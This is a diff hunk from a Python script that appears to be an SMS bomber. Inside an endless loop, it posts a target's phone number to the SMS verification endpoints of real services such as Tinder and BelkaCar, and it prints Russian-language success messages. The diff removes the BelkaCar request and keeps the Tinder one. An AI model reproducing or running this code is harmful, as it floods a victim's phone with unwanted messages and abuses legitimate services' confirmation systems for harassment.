@@ -80,12 +80,6 @@ while True:
 		print(Fore.RED + '[-] Не отправлено!')
 
 	try:
-		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-		print(Fore.GREEN + '[+] BelkaCar отправлено!'
-	except:
-		print(Fore.RED + '[-] Не отправлено!')
-
-	try:
 		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
 		print(Fore.GREEN + '[+] Tinder отправлено!')
 	except:
